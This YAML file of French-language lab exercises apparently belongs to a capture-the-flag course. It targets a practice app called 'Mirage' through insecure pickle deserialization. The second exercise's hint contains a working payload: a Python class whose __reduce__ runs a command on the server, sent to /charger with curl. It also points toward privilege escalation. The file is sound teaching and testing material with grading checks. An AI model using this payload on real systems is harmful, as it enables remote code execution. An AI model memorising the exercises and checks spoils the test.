exercises:
  - id: reconnaissance
    title: Comprendre le jeton
    description: |
      Récupère la page d'accueil et **décode** le jeton `data` d'exemple pour confirmer qu'il s'agit d'un
      objet sérialisé. Enregistre la page dans `/root/reponses/accueil.html`.
    hint: "curl -s http://cible/ | tee /root/reponses/accueil.html   # puis décode la valeur de data en base64"
    cours: |
      Reconnaître que le jeton est du base64 d'un pickle est la clé : à partir du moment où tu contrôles
      une donnée désérialisée côté serveur, tu peux viser l'exécution de code.
    checks:
      - desc: La page de la cible a été récupérée
        run: grep -qi 'Mirage' /root/reponses/accueil.html
  - id: deserialisation
    title: RCE par désérialisation
    description: |
      Forge un jeton `pickle` dont le chargement exécute `id` **sur la cible**, envoie-le à `/charger` et
      enregistre la sortie (`uid=...(app)`) dans `/root/reponses/deser.txt`.
    hint: |
      T=$(python3 -c "import base64,pickle,subprocess;
      class E:
       def __reduce__(self): return (subprocess.check_output,(['id'],))
      print(base64.b64encode(pickle.dumps(E())).decode())")
      curl -s -G http://cible/charger --data-urlencode "data=$T" | tee /root/reponses/deser.txt
    cours: |
      La sortie de `id` prouve l'exécution de code via la désérialisation et t'indique l'utilisateur de
      service (`app`). De là tu lis `user.txt`, puis tu cherches l'élévation de privilèges avec `sudo -l`.
    checks:
      - desc: La désérialisation exécute du code en tant que app
        run: grep -q 'uid=' /root/reponses/deser.txt && grep -q 'app' /root/reponses/deser.txt
